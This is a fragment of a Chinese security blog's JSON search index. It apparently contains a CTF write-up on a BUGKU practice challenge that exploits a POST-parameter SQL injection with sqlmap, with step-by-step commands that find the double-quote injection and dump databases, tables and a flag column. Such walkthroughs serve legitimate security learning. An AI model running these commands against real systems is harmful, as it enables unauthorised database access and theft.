两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"SQLinjection","slug":"SQLinjection","permalink":"http://www.r1ght0us.xyz/tags/SQLinjection/"},{"name":"手动注入","slug":"手动注入","permalink":"http://www.r1ght0us.xyz/tags/手动注入/"}]},{"title":"SQLMAP-POST注入","slug":"SQLMAP-POST注入","date":"2018-08-17T05:11:14.000Z","updated":"2019-01-06T08:59:14.452Z","comments":true,"path":"2018/08/17/SQLMAP-POST注入/","link":"","permalink":"http://www.r1ght0us.xyz/2018/08/17/SQLMAP-POST注入/","excerpt":"POST注入+SQLMAP","text":"POST注入+SQLMAPBUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。 抓包，复制出来打成一个txt文件 sqlmap -r test.txt -p admin_name –dbs因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。 -r 指定一个文件。 -p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。 –dbs 爆出所有的数据库。 点击回车运行，竟然发现无法进行sql注入！ 上图是我进行注入失败，后面继续追加了下面的参数 -v 这个是展现攻击测试的详细过程的程度，一般设为3就足够。 –threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。 sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3 如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。 解释参数： –level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –tablesqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。 解释参数： -D 指定数据库。 -T 指定表。 –table 数据库爆表名。 –dump 显示所有字段。 题目地址","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://www.r1ght0us.xyz/tags/kali/"},{"name":"SQLinjection","slug":"SQLinjection","permalink":"http://www.r1ght0us.xyz/tags/SQLinjection/"}]}]}